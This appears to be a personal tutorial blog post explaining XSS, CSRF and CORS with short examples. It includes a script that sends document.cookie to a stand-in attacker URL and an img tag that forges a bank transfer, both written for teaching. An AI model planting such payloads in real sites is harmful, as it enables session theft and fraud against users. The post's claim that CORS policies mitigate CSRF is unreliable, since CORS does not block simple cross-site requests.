---
layout: post
category : 
tags : [learning, tutorial]
use_math : true
---
{% include JB/setup %}

Recently I was working on some identity managment projects. During the investigation, I reviewed some security knowledge and found myself didn't tell three basic concepts quite well. Sometimes, I felt hard to remeber the exact scenarios of them and would misuse one of them to describe the scenario which should be another one. The three terminologies are XSS(Cross-site scripting), CSRF(Cross-site request forgery), CORS(Cross-origin resource sharing).

## **XSS \(Cross-site scripting\)**
Two of the most common attacks against websites and web application are XSS and CSRF. 

```
In case of XSS, the victims's trust for a website is exploited, in case of CSRF, the website's trust for a victim's browser is exploited.
```

In case of XSS, attacker would make the victim to execute a piece of injected script. Since the script would be run under the website domain which is trusted by the victim, the attacker can utlize this script to collect some information, such as cookies, and then send these sensitive information to attacker's website. 

Imagine there was a website that provides a search box and it would generate a query url as following based on the content in it each time you click the search button.

```
https://example.com/search?query=<SearchContent>
```

It works well if the search content is just some normal key words. But what if the search content is a script like following? 

```
https://example.com/search?query=<script>alert(1)</script>
```

The script can be executed in the trusted website's domain. We just emit an alert in this script, a worse case could be an injected script to collect and send user cookies like following.

```
<script>
new Image().src="http://attackerurl.com/storecookie?cookie="+document.cookie;
</script>
```

To mitigate this issue, **HTTPOnly** cookie attribute can be used to prevent access to the cookie value through JavaScript.

How could the attacker inject his script to a trusted website? This [post][2] provides some practical scenarios of the XSS attack. 


## **CSRF(Cross-site request forgery)**
In case of CSRF, attacker would try to let browser send a request to an honest website on behalf of the victim. If the victim has already logged in the honest website, these kinds of requests may get some sensitive information of the victim. 

Imagine the victim has already logged in the honest website "www.bank.com", and there was a attcker's website "www.attacker.com" whose content is 

```
<img src="https://www.bank.com/action=transfer&receiver=attacker">
```

Since the victim has already logged in, this request might be send to "www.bank.com" with victim's credentials in the cookies. Then "www.bank.com" would recognize this request is sent on behalf of the victim although it is a cross-site request.

To mitigate this issue, we could use some CORS(Cross-origin resource sharing) polices which prevents the cross-site request.

## **CORS(Cross-origin resource sharing)**
CORS(Cross-origin resource sharing) is a mechanism that allows restricted resources on a web page to be requested from another domain from which the first resource was served. By using it, we can mitigate the CSRF a little bit since the honest website would not allow the request from the attacker's domain to access victim's resources.

[1]: https://medium.com/@l4mp1/difference-between-xss-and-csrf-attacks-ff29e5abcd33
[2]: https://pentest-tools.com/blog/xss-attacks-practical-scenarios/
[3]: https://engineering.mixmax.com/blog/modern-csrf/